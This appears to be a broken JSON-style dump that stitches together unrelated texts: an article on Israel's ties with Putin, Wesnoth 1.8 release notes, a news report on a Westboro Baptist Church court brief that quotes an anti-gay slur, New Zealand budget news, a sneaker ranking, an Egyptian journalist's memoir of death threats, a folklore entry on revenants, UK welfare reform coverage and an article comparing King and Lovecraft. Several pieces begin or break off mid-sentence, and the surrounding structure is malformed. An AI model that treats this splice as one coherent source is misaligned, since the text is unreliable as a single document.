decade though, after the conclusion of the recent P5+1's nuclear agreement with Iran, Russia announced its intention to finally deliver the S-300s it had promised.A former head of Israel's missile defense program noted that \"there will be a dramatic change in [Iran's] capability, and it does not create a reasonable environment for any operation of our air force.\" Israel now seeks to use its positive relationship with Putin to limit further spillover effects from Moscow's decision, in particular to ensure that Iran's S-300s never reach Hezbollah.Finally, Israel's third major interest vis-à-vis the Kremlin is the approximately 200,000 Jews remaining in Russia. Indeed, Putin's positive feelings towards Israel are echoed by what some describe as Putin's philosemitism, or affinity for the Jewish faith. Domestically, Putin counts numerous Jewish businessmen and officials as friends, and acknowledges the positive influence of Jews on him during his childhood. Putin also supported the founding of the Jewish Museum and Tolerance Center in Moscow, even donating his own money; stated his \"fierce opposition to any manifestation of anti-Semitism and xenophobia\"; ensured the return of many synagogues to Russian Jews previously seized by the Soviets and just initiated a law against anti-Semitic Biblical commentary.Despite Putin's positive disposition towards Russian Jews, given the history of anti-Semitism in Russia, Israeli leaders surely understand that a serious deterioration in the Moscow-Jerusalem relationship could hurt the status of the country's relatively small Jewish population. This offers Israel yet another reason to maintain good relations with the Kremlin.Israeli foreign policy related to the Ukraine crisis reflects Jerusalem's desire to avoid alienating Putin. After Russia annexed Crimea, Israel abstained from voting on a United Nations resolution condemning Russian actions - which in UN-speak is actually equivalent to voting against it. Afterwards, Israeli Foreign Minister Avigdor Lieberman issued the blandest of statements, saying that \"our basic position is that we hope Russia and Ukraine will find a way as quickly as possible to normalize relations, and find a way to talks, and to solve all the problems peacefully.\"The US State Department issued a statement noting it was \"surprised Israel did not join the vast majority of countries that vowed to support Ukraine's territorial integrity in the UN.\" Despite American criticism, shortly thereafter Israel also agreed on the installation of a special encrypted communications line between Netanyahu's and Putin's offices. Given the United States' strong opposition to Putin's move on Crimea, Israel's willingness to defy its closest ally indicates the extent to which Israeli leaders seek to maintain a good relationship with Putin.With the Russian Bear now firmly ensconced on its northern border, expect Israel's leaders to continue paying close attention to the man in the Kremlin.Josh Cohen is a former USAID project officer involved in managing economic reform projects in the former Soviet Union.

  "latent_13969": "Battle for Wesnoth 1.8 Release Notes\n\nApril 2010. It is once again time for that thrill you've all been waiting for, a Wesnoth stable release. The Battle for Wesnoth team is proud to release version 1.8 of The Battle for Wesnoth, a free open-source turn-based strategy game with a fantasy theme and roleplaying elements. The game is available for download now for Windows, Mac OS X and various GNU/Linux distributions.\n\nWhat's new in Wesnoth 1.8\n\nThe improvements this time around include one entire new full-length campaign, hundreds of new and revised unit portraits, five new music tracks, some UI redesign, and substantial improvements in the game's AI.\n\nFor Players\n\nTo help the player keep those who are loyal to him alive, these units are now marked with an overlay symbol that looks like a bronze ring.\n\nThe names on maps and other images can now be localized to the player's language; several languages already use this new feature. For more information and tutorials, look at the wiki article on Image Localization.\n\nCampaigns\n\nA new campaign, Delfador's Memoirs , tells the tale of how a mage-apprentice rose to become Delfador the Great. This campaign was imported from the Wesnoth-UMC-Dev project, where it spent almost a year being adapted for mainline.\n\nWe've continued to polish and improve the mainline campaigns. The hero Kaleh's custom advancements in Under the Burning Suns , long a source of problems, have been redesigned in a more robust and streamlined fashion. Significant continuity problems in Heir to the Throne's \"Cliffs of Thoria\" scenario have been fixed. Some scenarios in Legend of Wesmere have been rewritten and significantly enhanced. An early version of its multiplayer port is available to test Wesnoth's multiplayer campaign feature.\n\nThere are five new full-orchestral music tracks: Casualties of War , Into the Shadows , Journey's End , Over the Northern Mountains , and Weight of Revenge .\n\nThe game AI has been significantly debugged and improved; it chooses recruits/recalls better, and does smarter target selection.\n\nMultiplayer\n\nThe operating system's GUI can be told to notify the player that it's his turn to play.\n\nThe multiplayer lobby has been completely redesigned for improved ease of play and better appearance.\n\nRandom numbers are generated on the Wesnoth multiplayer server during MP combats. This makes certain kinds of cheats and out-of-sync conditions impossible, at the cost of breaking compatibility with versions before 1.7.13.\n\nGeneral\n\nThe right sidebar on the main game display has been tuned for usability. It now gives more prominence to the selected unit's terrain defence percentage and time-of-day modifier.\n\nThere is a new monster unit: the Water Serpent. Additionally, the Dwarvish Scout from Under the Burning Suns is now part of normal Dwarvish sides in campaigns. Several other unit lines — most notably the Drakes — have been completely redone with improved art and animations. A remake of the merfolk units out of our Art Director's virtual pencil has been completed in this release cycle. (But most animations are still missing for them.)\n\nAdd-on descriptions are now accessible from the add-on download dialog via a button.\n\nMost translations have been updated. In addition, Vietnamese has returned, and we have a new transliteration, English in the Shavian alphabet.\n\nFor Content Developers\n\nThis year Wesnoth was once again a Google \"Summer of Code\" program; one of its major results was a complete rework of Wesnoth's support for multiplayer campaigns. Sides in multiplayer games are now persistent and can be carried over from one multiplayer scenario to the next. The leaders of AI sides are now able to recall from their side's list. As a side effect it is now possible to have more than one leader with the ability to recruit per side.\n\nAnother Summer of Code result is a new framework for Wesnoth's artificial intelligence. The AI can now be scripted to significantly change its behavior in different story settings and in response to campaign events, give enemy sides more distinct tactical personalities. It is possible, though not easy, to use scripting languages (formula_ai, lua) to create alternate AIs that are also scriptable.\n\nA new tool called the \"gamestate inspector\" allows a content developer to view the values of the WML variables, ai configuration, and the recall list while a game is in progress.\n\nNew Orcish Village and Orcish Keep terrain graphics improve the options available to map designers.\n\nWe've also achieved excellent results with our inaugural 'Summer Art Scholarship' program. This has led to dozens of new portraits, as well as a complete rework of the Drake sprites. We hope to continue this program in coming years.\n\nWe paid a lot of attention to world continuity, from small details like replacing earth-human names for characters up through larger ones like putting many new placenames on the main map. The main Wesnoth history timeline has been tweaked to eliminate various minor inconsistencies.\n\nWe kept the promise we made in 1.6 when we had to remove Python for technical reasons; WML events and AI components can now be written in lua. The integration of lua in the wesnoth game engine is advanced enough to even allow the coding of WML action tags with lua definitions that can read and modify game state variables in the C++ core.\n\nDownload\n\nBattle for Wesnoth is made available under the GNU General Public License (GPL). Source code is available from wesnoth.org where you will also find instructions for building from source on a range of different operating systems. Ready-to-go packages are also available for most popular operating systems, including Linux and Windows and Mac OS X.\n\nYou can get up to date information about downloads at the downloads page. There you can also find packages and instructions for other platforms once they are available.\n\nIf you downloaded previous versions of the game, you might be interested in downloading the xdelta files only.\n\nMore Info",
  "latent_14008": "Email Share +1 694 Shares\n\nThe virulently anti-gay Westboro Baptist Church is seeking to intervene in a legal challenge against the ban on same-sex marriage in Kansas, citing fear of God’s wrath if the court rules in favor of the right of gay couples to marry.\n\nIn a 22-page legal brief filed Sunday loaded with references to biblical Scripture and condemnation of homosexuality, the Church seeks to take part in a lawsuit pending before the U.S. District Court for the Kansas, saying same-sex marriage “is utterly contrary to Bible doctrine.”\n\n“Same-sex marriage will destroy Kansas,” the brief states. “If this Court requires Kansas officials to treat what God has called abominable as something to be respected, revered, and blessed with the seal-of-approval of the government, that will cross a final line with God. The harm that will befall this state, when the condign destructive wrath of God pours out on Kansans is the ultimate harm to the health, welfare and safety of the people.”\n\nThe Westboro Baptist Church, based in Topeka, is considered a fringe religious organization, and has gained a reputation for picketing the funerals of fallen U.S. service members, saying acceptance of homosexuality in the United States was responsible for their deaths. Church members carry signs at protests near funerals, as well as Pride celebrations, bearing anti-gay messages, such as “God Hates Fags.”\n\nAlthough the brief doesn’t contain the same anti-gay slurs that have made the church infamous, the filing does envision calamity if same-sex marriage is legalized in Kansas based on the biblical scripture. Stories cited by the church include the destruction of Sodom & Gomorrah, ancient cities thought to have incurred God’s wrath for allowing homosexuality, and God’s destruction of civilization worldwide by Noah’s flood.\n\n“Homosexuality is destructive in every way, to the individual and to the nation,” the brief says. “Government should not put its seal of approval on that unholy union by issuing a marriage license. Government’s interest is in doing the opposite, for the good of the people and the nation.”\n\nThe lawsuit seeking marriage equality, Marie v. Mosner, was filed this month by the American Civil Liberties Union of Kansas. The lawsuit seeks to compel the state to stop enforcing its ban on same-sex marriage based on precedent enacted by the U.S. Tenth Circuit Court of Appeals in rulings against same-sex marriage bans in Utah and Oklahoma.\n\nAlthough Kansas Gov. Sam Brownback and Attorney General Derek Schmidt have pledged to defend the state’s ban on same-sex marriage, the Westboro Baptist Church insists it must intervene because, among other reasons, political pressure for state officials to disagree with the church and their inability to invoke religion in the arguments.\n\n“The Kansas Attorney General is unable to adequately represent WBC because to do so would cause the Attorney General to assert religious viewpoints and constitutionally protected religious rights, which is arguably contrary to the duty of the government to remain neutral on matters of religion, and would constitute a breach of the separation of church and state doctrine,” the brief says.\n\nThe brief is signed by Margie Phelps, counsel to the church and daughter of the late church-founder Fred Phelps, as well as Rachel Hockenbarger, a lawyer at the Topeka-based Phelps Chartered law office.\n\nAdam Romero, federal legal director for the Williams Institute at the University of California Los Angeles, said he anticipates the court will deny the church’s request to intervene.\n\n“Other courts have denied similar requests in various same-sex marriage litigations, concluding that groups that oppose same-sex marriage do not have a legally-protectable interest in the litigation and should not otherwise be permitted to formally join the case,” Romero said. “The Kansas District Court might permit Westboro Baptist Church to file an amicus brief, so that the church can be heard, but I do not think the Court will permit the church to formally intervene in the case.”\n\nEven in the event the court allows the church to intervene, it’s hard to see how it could be successful given precedent enacted by the Tenth Circuit in favor of same-sex marriage and the U.S. Supreme Court’s refusal to review rulings legalizing marriage equality in that jurisdiction.\n\nThomas Witt, executive director of Equality Kansas, said the brief is indicative of the views of those who draw on religion to oppose LGBT rights.\n\n“Their motion to intervene shows the true colors of everyone who uses their religion as a reason to deny equal rights to LGBT couples,” Witt said.\n\n[h/t Kathleen Perrin]",
  "latent_14040": "This year's promised Budget surplus is under renewed pressure with Prime Minister John Key conceding it will be \"very tight\" and may come in a year late.\n\nNew Treasury figures showed the state of the books had worsened slightly in the first three months of the financial year, with the deficit at $725 million - $79m higher than forecast in May\n\nKey said his confidence in reaching the target had gone \"back a step\" since the election.\n\nThe Government still wanted to achieve a surplus this year, and Finance Minister Bill English was working on the numbers. Treasury would update its forecasts on December 16.\n\nBut he wouldn't take \"a knee-jerk reaction to get there\".\n\n\"We are on the right trajectory. We've been massively slashing those deficits so in the preferred world we'd get there in 2014/15. If we don't it will be a year later,\" Key said.\n\nThe question was how close the surplus would be and what it would take to achieve it.\n\nThe pre-election forecast from Treasury tipped a narrow surplus of $297m for the year.\n\nBut Key said there were a number of things weighing against it. Tax revenue was running behind forecast, and inflation was low.\n\n\"Ironically it's great for the economy, but it has some impact on our capacity to meet surplus.\"\n\nLabour finance spokesman David Parker said the Government was running our of excuses and its struggle to reach surplus was due to poor economic management.\n\n\"The drop in GST and the warning of a fall in total tax take shows what happens when the economy is unbalanced – typical New Zealanders can't get ahead.\"\n\nAt the same time the huge salary increases for power companies' chief executives was out of line with the meagre pay rises of most Kiwis.\n\nFinance Minister Bill English said the accounts for the latest three months were broadly consistent with forecasts \"but highlight the challenge of returning to surplus\".\n\nExpenses at $18.1 billion were 0.7 per cent higher than forecast and core tax revenue of $15.5b was 0.5 per cent above forecast.\n\nTreasury said both other individuals and corporate tax was better than expected but GST was $175m lower as a result of softer domestic consumption.\n\nEnglish said tax revenue remained uncertain for the rest of the financial year.\n\nCore crown net debt stood at $62.6b, equal to 27.3 per cent of GDP.",
  "latent_14110": "6 minutes to read\n\n2015: a year when sneakers flooded the footwear market, overpowering the big hitters such as Vans and Converse, rapidly becoming the shoe that everyone must have on their feet.\n\nAs hard as it has been to sift through the multitude of sneakers that I could only dream about owning one day, I have come up with my personal top 10 favourite collaborations of 2015, starting with the amazing pair of Zeniths by great guys at Laced in Brisbane.\n\n10. Banana Benders\n\nThe Banana Benders are Laced‘s first shot at the collaboration game and they have hit it out of the park with the Queensland themed sneakers. Excellent colours and concepts paired with the ungodly number of 666 pairs worldwide makes this shoe a must have for all Australian sneakerheads worthy of turning heads.\n\n9. Da Vinci\n\nNext up is one of the most sophisticated releases to have launched last year. Commonwealth‘s second take at the Gel Lyte V named the Da Vinci, which takes conceptual elements straight from the big inventor himself. Coming bundled with a notepad and a selection of goodies this shoe is one of the cleanest, well constructed and limited shoes this year.\n\n8. R698 Low\n\nFrom the king of collaborations comes his latest project, taking inspiration from his new stores that opened in Japan, Ronnie Fieg’s fresh take on Puma’s R698 model, blossomed into one of last year’s hottest releases. This collaboration was released as a pack, and while both shoes are extremely nice, the low was a home run. The colours work extremely well together and, in my opinion, is the nicest R698 on the market right now!\n\n7. The High Roller Pack\n\nFor number 7, I’ve bundled three shoes into one spot on the list as they work as a trio, and that’s Las Vegas based boutique Feature and their take on the G9 Shadow 5. Taking inspiration from the neon city’s gambling culture, the High Roller Pack (The High Roller, The Barney and The Pumpkin) is extremely well thought out and executed so that you won’t have to take a gamble on whether you will look good with these on your feet.\n\n6. Husky\n\nHailling from the UK is the Reebok Ventilator Husky by END. This sneaker is one of the most visually beautiful Ventilators to come out. The use of great teture with the pastel colours works so well it sends a chill down your spine. The shoes are housed in fancy frosted class packaging and is one a sure fire hit for all Reebok fans.\n\n5. Luxury Goods\n\n<span\n\nclass=”s1″> CONCEPTS released their luxurious take on the 997 silhouette by New Balance called the Luxury Goods. This sneaker, along with most of CONCEPTS’ other collabs, sports some of the nicest materials on a shoe that we saw last year, and this is combined this with the bright orange pigskin suede that is extremely reminiscent of the luxury brand, Hermés. This shoe brings class to any event with the Made in USA model giving you the height of sneaker quality that is almost unmatched.\n\n4. 8 Ball\n\nCONCEPTS are on the list for a second time after smashing out another supreme collaboration last year, and with this instalment they’ve stayed with Asics but have used a different silhouette, the Gel Lyte 5. CONCEPTS are no strangers to this shoe and they always find new ways to create a design that has both a strong, interesting backstory and also nail the execution. The 8-Ball is based off the movie Blow and takes cues from a culture that has a dark side. An off white or ‘cocaine’ upper with hints of red really blow away the competition this year.\n\n3. The Righteous One\n\nStarting the prime position rankings is another Saucony, this time by the boutique Epitome who designed The Righteous One. What else can we say about this shoe, from its insane quality materials to the small features and hints of Atlantan and Middle Eastern vibes. This shoe could not get any fresher if it tried and will be one to add to any collection if you can spare an arm and a leg.\n\n2. Trico\n\nTaking the number two spot is the collaboration of the Gel Lyte 3 by Asics and Japanese retailer MITA to create the Trico. It has a simple yet effective mix of colour blocking and an innovative take on the silhouette by adding a heel tab, and piping along the toe box, standing out from the rest of the competition. The materials on this shoe are by far some of the best suede that can be found on a pair of Asics, and having a shoe based off the Japanese store with its use of metal fences somehow worked itself well into the shoe in the subtlest of ways.\n\n1. Kushwacker\n\nTaking the number one spot was a shoe that hits extremely close to home, Melbourne to be exact, and is one of the best Saucony collaborations to date. Sneaker Freaker’s ‘Kushwacker’ is the sequel to their insanely popular ‘Bushwacker’ collaboration that debuted in 2012. The Kushwacker obviously takes its inspiration from an illegal substance, as noted by the name and the stunning purple tones on the shoe. The Kushwacker uses the finest materials throughout the shoe and\n\ngetting your hands on this extremely limited sneaker may prove to be quite a challenge now as these shoes fetch ungodly prices on the market, along with every other pair on this list.",
  "latent_14267": "Just last week, the sound of bullets was so loud and close that we all rushed into the lobby of the hotel near the Media Production City. Since the imposition of an emergency curfew following the Brotherhood’s attacks on churches, journalists, government bureaucrats and ordinary citizens, the hotel has become a twin of Baghdad’s famous Rashid Hotel during the Iraq war: a place of gathering and shelter for journalists. When the bullets died down, we made sure no one had been hurt.\n\nOn my first night at the hotel, a motorcycle carrying three men tried to crash into the lobby. They fired shots into the hotel, and a police chase ensued. When two of the three were captured, they said that they had just been lost in the desert and confused, a funny excuse for something that was not funny at all.\n\nRemaining in the hotel with other television journalists, also living under death threats, was terribly depressing. For safety’s sake, I asked a police officer to escort me back to Media City, even though my house is only 10 minutes from the compound. As the siren of the police car driving ahead of me blared its way through the curfew and I sat next to a police officer in a bulletproof vest holding an automatic rifle, I recalled the day in 1992 when I opened the door to my apartment and found an officer from the Interior Ministry, warning me that I had appeared on a militant group’s list of assassination targets because of my criticism of Islamists.\n\nAt the time, I was writing against the rising tide of terrorism and extremism during a difficult phase in Egypt’s history. I was also single. Looking around my small, sparsely furnished apartment in obvious distaste, the officer asked me if I wanted a moving guard (who would accompany me everywhere I went) or a fixed guard (who would just stand outside my home or workplace). I told him that I didn’t own a car, and asked whether the officer would just ride the subway or the public bus with me. The officer was fed up with me and decided I would get a fixed guard.\n\nThe guard’s job was to accompany me as I crossed the street, then stand by my side as I negotiated with taxi drivers to take me to work. Once I’d found my ride for the day, he would wave, then go back to his post outside my apartment building. Later, when I learned more about confessions by members of the group that had targeted me, I learned that they knew where I lived, that the sister of one of the men lived nearby, and that I had been under threat wherever I went. During this period, I learned to be brave in the face of death, and since then, I have not feared anything else. Since the start of my career, I have faced accusations of blasphemy and death threats. I have been fired; seen publications I’ve edited get shut down; and watched as copies of my novel “Assassination of the Big Man” were seized.\n\nLast week, as I waited for the police car to escort me to the studio and for the fully armed officer next to me to shield me from a potential attack, I found history repeating itself on a grander, more dangerous scale. It’s as if terrorism will never end, and my fate is to face death because of what I write and what I say. Sometimes, when I set out for work and say goodbye to my wife and children, I feel like a soldier waving to his family from a train as he heads toward battle.",

  "latent_14392": "In folklore, a revenant is a visible ghost or animated corpse that is believed to have revived from death to haunt the living.[6][7] The word revenant is derived from the Old French word, revenant, the \"returning\" (see also the related French verb revenir, meaning \"to come back\").\n\nRevenants are part of the legend of various cultures, including Old Irish Celtic and Norse mythology,[8] and stories of supposed revenant visitations were documented by English historians in the Middle Ages.[9]\n\nComparison to other folkloristic and mythological undead [ edit ]\n\nThe terms \"vampire\", \"ghost\", and \"revenant\" have been used interchangeably by folklorists,[10] while some maintain that vampires derive from Eastern European folkore while revenants derive from Western European folklore, many assert that revenant is a generic term for the undead.[11]\n\nAugustin Calmet conducted extensive research on the topic in his work titled Traité sur les apparitions des esprits et sur les vampires ou les revenans de Hongrie, de Moravie, &c. (1751) in which he relates the rumors of men at the time:[12] Calmet compares the ideas of the Greek and Egyptian ancients and notes an old belief that magic could not only cause death but also evoke the souls of the deceased as well. Calmet ascribed revenants to sorcerers who sucked the blood of victims, and compares instances of revenants mentioned in the twelfth century in England and Denmark as similar to those of Hungary, but \"in no history do we read anything so usual or so pronounced, as what is related to us of the vampires of Poland, Hungary, and Moravia.\"[10][13]\n\nA possible precursor of the revenant legend appears in Norse mythology, called the draugr or aptrgangr, literally \"again-walker\", meaning one who walks after death. Stories involving the aptrgangr often involve confrontations with the creature. The aptrgangr resists intruders to its burial mound and is often immune to conventional weapons, which renders the destruction of its body a dangerous affair to be undertaken by individual heroes.[9]\n\nIn the folklore and ghost stories of Eastern Scandinavia, Finnish \"dead-child beings\" are described as revenants animated by restless spirits that could be laid to rest by performing baptism or other religious rites.[14]\n\nReferences to revenant-like beings in Caribbean lore are often referred to as \"The soucouyant\" or \"soucriant\" in Dominica, Trinidadian and Guadeloupean folklore, also known as Ole-Higue or Loup-garou elsewhere in the Caribbean.[9]\n\nSelected stories [ edit ]\n\nWilliam of Newburgh [ edit ]\n\nBelief in souls returning from the dead was common in the 12th century, and Historia by William of Newburgh (1136–1198) briefly recounts stories he heard about revenants, as do works by his contemporary, Walter Map. [15]\n\nWilliam wrote that stories of supposed revenants were a \"warning to posterity\" and so common that, \"were I to write down all the instances of this kind which I have ascertained to have befallen in our times, the undertaking would be beyond measure laborious and troublesome.\"[16] According to William, \"It would not be easy to believe that the corpses of the dead should sally (I know not by what agency) from their graves, and should wander about to the terror or destruction of the living, and again return to the tomb, which of its own accord spontaneously opened to receive them, did not frequent examples, occurring in our own times, suffice to establish this fact, to the truth of which there is abundant testimony.\"[16]\n\nOne story involves a man of \"evil conduct\" absconding from justice, who fled from York and made the ill-fated choice to get married. Becoming jealous of his wife, he hid in the rafters of his bedroom and caught her in an act of infidelity with a local young man, but then accidentally fell to the floor mortally wounding himself, and died a few days later. As Newburgh describes:\n\nA Christian burial, indeed, he received, though unworthy of it; but it did not much benefit him: for issuing, by the handiwork of Satan, from his grave at night-time, and pursued by a pack of dogs with horrible barkings, he wandered through the courts and around the houses while all men made fast their doors, and did not dare to go abroad on any errand whatever from the beginning of the night until the sunrise, for fear of meeting and being beaten black and blue by this vagrant monster.\n\nA number of the townspeople were killed by the monster and so:\n\nThereupon snatching up a spade of but indifferent sharpness of edge, and hastening to the cemetery, they began to dig; and whilst they were thinking that they would have to dig to a greater depth, they suddenly, before much of the earth had been removed, laid bare the corpse, swollen to an enormous corpulence, with its countenance beyond measure turgid and suffused with blood; while the napkin in which it had been wrapped appeared nearly torn to pieces. The young men, however, spurred on by wrath, feared not, and inflicted a wound upon the senseless carcass, out of which incontinently flowed such a stream of blood, that it might have been taken for a leech filled with the blood of many persons. Then, dragging it beyond the village, they speedily constructed a funeral pile; and upon one of them saying that the pestilential body would not burn unless its heart were torn out, the other laid open its side by repeated blows of the blunted spade, and, thrusting in his hand, dragged out the accursed heart. This being torn piecemeal, and the body now consigned to the flames...\n\nIn another story Newburgh tells of a woman whose husband recently died. The husband revives from the dead and comes to visit her at night in her bedchamber and he \"...not only terrified her on awaking, but nearly crushed her by the insupportable weight of his body.\" This happens for three nights, and the revenant then repeats these nocturnal visits with other nearby family and neighbours and \"...thus become a like serious nuisance,\" eventually extending his walks in the broad daylight around the village.

The whole following night they walked through the paths and fields of the village, now in the shape of men carrying wooden coffins on their shoulders, now in the likeness of bears or dogs or other animals. They spoke to the other peasants, banging on the walls of their houses and shouting \"Move quickly, move! Get going! Come!\"\n\nThe villagers became sick and started dying, but eventually the bodies of the revenants were exhumed, their heads cut off, and their hearts removed, which ended the spread of the sickness.[18]\n\nWalter Map [ edit ]\n\nThe chronicler Walter Map, a Welshman writing during the 12th century, tells of a \"wicked man\" in Hereford who revived from the dead and wandered the streets of his village at night calling out the names of those who would die of sickness within three days.

That's because the plan will cost more initially as claimants retain some of their benefits when they go back to work. Mr Duncan Smith is convinced that to reap the financial and social gains of fewer people reliant on benefit, the government must \"invest\" in his new universal credit now. Overhauling the benefit system is likely to take at least a decade, but George Osborne will want to see evidence that that extra up front money is bearing fruit a lot sooner than that.\n\nMr Duncan Smith said: \"We will break the cycle of dependency and poverty that has become so entrenched in our poorest communities. We must turn entrapment into aspiration, dependency into contribution, and poverty into growth.\"\n\nWelfare reform is key to plans to cut the UK's deficit, but has been the source of reported tension between ministers.\n\nThe issue is likely to be a key subject of debate when the Conservatives meet for their annual conference in Birmingham on Sunday.\n\nChancellor George Osborne and Mr Duncan Smith said they had now agreed on an \"affordable investment package\" to reform the welfare system, which they said was \"broken, wildly expensive and often traps the very people it is meant to help\".\n\nMr Osborne had signalled that he wanted billions of pounds worth of welfare cuts as part of the government's imminent spending review - on top of £11bn outlined in June's Budget.\n\nIt is understood Mr Duncan Smith fought hard within government to replace the current system of benefits - including jobseeker's allowance, housing benefit, income support and employment support allowance - with the single universal payment.\n\nHowever no further details have yet been given of exactly how the reforms will be funded.\n\nUniversal credit will use pay-as-you-earn (PAYE) tax data to make it easier to calculate what people are entitled to. This would also reduce the cost of fraud and error, said the government.\n\nIn moving everyone to the new system, they said they would \"prioritise those who need help most\".\n\n\"The Department for Work and Pensions and Treasury have worked hard to make sure that there will be no losers as a result of the migration plan,\" said a statement.\n\nThe reforms will be introduced in a White Paper in the autumn, and then put to Parliament in a welfare reform bill next year.\n\nThe government said the new scheme, combined with its Work Programme, would also see unemployed people getting more personalised support to get them back into work.\n\nAny scheme to ensure that work pays is to be welcome Ian Cheese Send us your comments\n\nMr Duncan Smith added: \"To those that have been marginalised and abandoned to a life on benefits by Labour I say: 'We will get you back into work and in control of your life'. For the most vulnerable I say: 'We will protect you'.\n\n\"And to the taxpayer I say: 'Here is true value for money, a system that invests in you and supports you in your time of need but expects everyone in society to contribute and will no longer allow anyone to choose a life on benefits'.\"\n\nParties together\n\nBBC political correspondent Robin Brant earlier said the plans were probably the \"most significant reform\" of the coalition so far.\n\nSome savings are already being made through restrictions in payments such as housing benefit, but the overall cost to the government is initially expected to rise after the changes are brought in as people return to work and retain some financial assistance.\n\nThere are no specific details on how long it will take for the savings to be realised but it is likely to be 10-15 years, our correspondent added.\n\nCarl Emmerson, from the Institute for Fiscal Studies, warned that the new system could potentially lead to some people losing money.\n\n\"Most people receiving out-of-work benefits are, by definition, in the bottom half of the income distribution,\" he said.\n\n\"So if they have their benefits reduced or taken away and they don't respond by moving into work, they will be... worse off and clearly the gap between their incomes and the incomes of those who are in work would widen.\"\n\nLabour MP Frank Field, who is the government's poverty tsar, has said he hopes the political parties will work together to make any reforms work for the long-term benefit of the country.",

  "latent_14628": "One of the great things about this Stephen King re-re-awakening is that people get excited about the author's classic novels again. It is in many ways the keystone work from King and determined a lot of what would come later, while hinting at a greater celestial tapestry of monsters and gods that he'd connect fully in his The Dark Tower series. Learning about Stephen King's deep cosmic horror should prompt a deep dive into one of King's biggest influences, the early 20th Century horror and sci-fi writer H.P. Lovecraft, who is basically the inventor of cosmic horror. Let's look at King's Lovecraftian gods.\n\nLovecraft's Cthulhu Mythos, which spans many stories and is the author's most famous contribution to horror literature, discusses beings from such groups as Great Old Ones, Elder Gods, Outer Gods, and more. This hierarchy is one of the most complex and varied of any in high-fantasy or science fiction, and he was always very open about other writers adding to and changing the mythology. It's a mythology in Wiki form. And while King mainly made up his own extensive mythology of gods and demons, several of them borrow heavily (or at least reference) some of Lovecraft's creations. Let's take a look at the most prominent.\n\nRandall Flagg\n\nKing's most frequent villain is the necromancer/sorcerer known by many names, but most consistently Randall Flagg. He's described as \"an accomplished sorcerer and a devoted servant of the Outer Dark\" and generally aims to bring down civilization through destruction or sewing discontent and conflict in humanity. Appearing in seven novels, either as main antagonist or merely a cameo, Flagg is responsible for some of the worst and most decidedly evil deeds in any of King's canon. He's the big bad--known as The Man in Black--in The Dark Tower and is the nemesis of all that is good and pure.\n\nThis figure directly mirror's Lovecraft's Outer God, Nyarlathotep, who is likewise the most frequently featured entity in the Cthulhu Mythos. Unlike most of the Outer Gods or Great Old Ones who rarely take a form fathomable by the human mind, Nyarlathotep often takes human form in order to collect devotees and spread chaos. He is deceptive and manipulative, and even uses propaganda to achieve his goals. He influences the deeds of men, and carries out the evil of larger Outer Gods as well as the wishes of cults devoted to him.\n\nKing has all but said Randall Flagg--especially in The Stand and The Dark Tower series--is one of the many guises of Nyarlathotep. Since the Outer Gods can travel between realities, you can read Lovecraft and know that \"The Crawling Chaos\" made his way into the King reality.\n\nIt/Pennywise\n\nIt, which King wrote in 1986, is by far the author's most Lovecraftian work, setting up the idea of a Macroverse (later called the \"Todash Darkness\" of The Dark Tower series), and ancient, otherworldly beings from outer space/a different plane of existence. Of these entities, the most prominent is It itself, an ancient creature that feeds off of fear, and then ultimately people themselves. Initially taking the guise of Pennywise the Dancing Clown, It claims its name is Robert Gray, and takes on the forms of various horror movie monsters and its final form of a giant spider. It also exists outside of the Earthly realm in an inter-dimensional plane It refers to as \"deadlights\" and if a human should see these lights, they would be driven immediately and irreversibly insane.\n\nIt is not a direct allusion to any one Lovecraftian entity the way Flagg is tied to Nyarlathotep, but actually draws from several. Firstly and perhaps most prominently is Great Cthulhu--not in visage but in approach. The famous phrase the Cult of Cthulhu uses often is \"At his home in R'lyeh, dead Cthulhu waits dreaming.\" The awakening of Cthulhu spells doom for all. It sleeps for 27 years and when it awakens, spells doom for those in Derry, Maine. It's final form as a giant spider-like monster is like that of several Lovecraftian nightmares. It using madness to maintain control, and humans being unable to fathom the awesome horror of such a creature also comes right out of Lovecraft's Cthulhu.\n\nMaturin/The Turtle\n\nIn It, we also learn about It's natural enemy, Maturin the Turtle, another ancient cosmic being that created our universe and countless others. In The Dark Tower, Maturin is established as one of the twelve Guardians of the Beams that hold up the Dark Tower itself. Though he acts mostly as a spectator to the events of It, Maturin is diametrically opposed to It (a being of creation versus a being of consumption) and aids Bill Denbrough in advising the Losers Club about the Ritual of Chud, which is the only thing that can ultimately destroy It.\n\nImage: Dominique Signoret\n\nIn Lovecraft, there are a few deities that could be tied to Maturin, though not explicitly. One of the hallmarks of Lovecraft's work is that pretty much all of his deities are evil, or at least apathetic to the plight of humanity. Maturin is the creator, but is an ultimately benevolent entity. The creator of our universe in Lovecraft is the behemoth Outer God Yog-Sothoth, a mass of glowing orbs, with eyes or tendrils in some versions. He is believed to be trapped outside of our reality, but has created many beings over which he has influence. Another, more benevolent being is Nodens, an Elder God whose domain is mainly the Dreamlands and who has an army of faceless, bat-winged Night-Gaunts which help him hunt the minions of Nyarlathotep. So, a pretty nice guy.\n\nGan\n\nIn Stephen King's mythology, Gan is the greatest deity of them all, creating every universe, including the universe all of the books take place, the universe where King writes those stories, and the universe in which we read them. King himself is a player in Gan's scheme to tell the story of the Gunslinger in The Dark Tower books. Had King died prior to completing these, then all of the infinite universes of the mythos would have ceased to exist as well.\n\nLovecraft's over-arching god is not nearly as benevolent. Azathoth is the greatest of Lovecraft's deities in the Cthulhu Mythos. Known as \"the blind idiot god,\" Azathoth is the god that dreams all of us, and all of everything. A disgusting mass of goopy tendrils and eyes, he rules over the Dreamlands through his emissary Nyarlathotep. What Azathoth wants, Nyarlathotep and others have to make happen, mostly because he's dreaming and can't do it himself. While people worship Azathoth, it's very likely Azathoth doesn't even know humanity exists, and should he ever awaken from his slumber, we would cease to exist.\n\nThere are obviously many, many more references in King's work to that of Lovecraft, and a phenomenal resource for this is Margaret L. Carter's 2005 essay \"The Turtle Can't Help Us: The Lovecraft Legacy in Stephen King's It,\" which you can read here. Suffice to say, without Lovecraft's doom-laden obsession with the hierarchy of gods that see us as playthings at best, King never would have dreamed up his complex mythology, and both are ones well worth getting lost in.\n\nKyle Anderson is the Associate Editor for Nerdist and the host of the horror documentary series One Good Scare.

